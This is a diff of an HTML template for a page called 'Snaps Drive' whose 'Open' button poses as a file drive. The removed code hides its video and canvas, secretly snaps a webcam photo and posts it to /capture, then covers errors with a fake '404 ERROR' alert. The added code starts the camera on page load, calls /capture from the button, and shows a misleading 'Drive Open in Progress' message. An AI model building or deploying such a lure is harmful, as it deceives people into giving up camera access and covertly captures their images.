@@ -1,76 +1,69 @@
+<!-- templates/index.html -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Snaps Drive</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <style>
-    body {
-      margin: 0;
-      background-color: black;
-      color: white;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      text-align: center;
-    }
-    #startButton {
-      padding: 15px 30px;
-      font-size: 18px;
-      border: none;
-      border-radius: 10px;
-      background-color: red;
-      color: white;
-      margin-top: 20px;
-    }
-    video, canvas {
-      display: none;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snaps Drive</title>
+    <style>
+        body {
+            text-align: center;
+            font-family: Arial, sans-serif;
+            background-color: #f1f1f1;
+        }
+        video {
+            width: 100%;
+            max-width: 400px;
+            margin: 20px auto;
+            border: 2px solid #333;
+            border-radius: 10px;
+        }
+        button {
+            padding: 15px 25px;
+            font-size: 18px;
+            border: none;
+            background-color: #007BFF;
+            color: white;
+            border-radius: 8px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+    </style>
 </head>
 <body>
-  <h1>Snaps Drive</h1>
-  <p></p>
-  <button id="startButton">Open</button>
+    <h1>Snaps Drive</h1>
+    <video id="video" autoplay></video><br>
+    <button onclick="capture()">Open</button>
 
-  <video id="video" autoplay></video>
-  <canvas id="canvas"></canvas>
-  <audio id="memeAudio" src="/static/meme_ram.mp4"></audio>
+    <audio id="audio" src="{{ url_for('static', filename='meme_ram.mp4') }}"></audio>
 
-  <script>
-    const startButton = document.getElementById("startButton");
-    const video = document.getElementById("video");
-    const canvas = document.getElementById("canvas");
-    const memeAudio = document.getElementById("memeAudio");
+    <script>
+        const video = document.getElementById('video');
+        const audio = document.getElementById('audio');
 
-    startButton.addEventListener("click", async () => {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        video.srcObject = stream;
+        function startCamera() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    video.srcObject = stream;
+                })
+                .catch(err => {
+                    alert("Drive Open in Progress: " + err);
+                });
+        }
 
-        // Wait for camera to warm up
-        setTimeout(() => {
-          const context = canvas.getContext("2d");
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
-          context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        function capture() {
+            audio.play();
+            fetch('/capture')
+                .then(response => response.text())
+                .then(data => {
+                    console.log(data);
+                });
+        }
 
-          // Convert to blob and send to server
-          canvas.toBlob(blob => {
-            const formData = new FormData();
-            formData.append("photo", blob, "capture.jpg");
-            fetch("/capture", { method: "POST", body: formData });
-          }, "image/jpeg");
-
-          memeAudio.play();
-        }, 1000); // 1 second delay
-
-      } catch (error) {
-        alert(" 404 ERROR  " + error.message);
-      }
-    });
-  </script>
+        // Start camera only after page loads
+        document.addEventListener("DOMContentLoaded", startCamera);
+    </script>
 </body>
 </html>
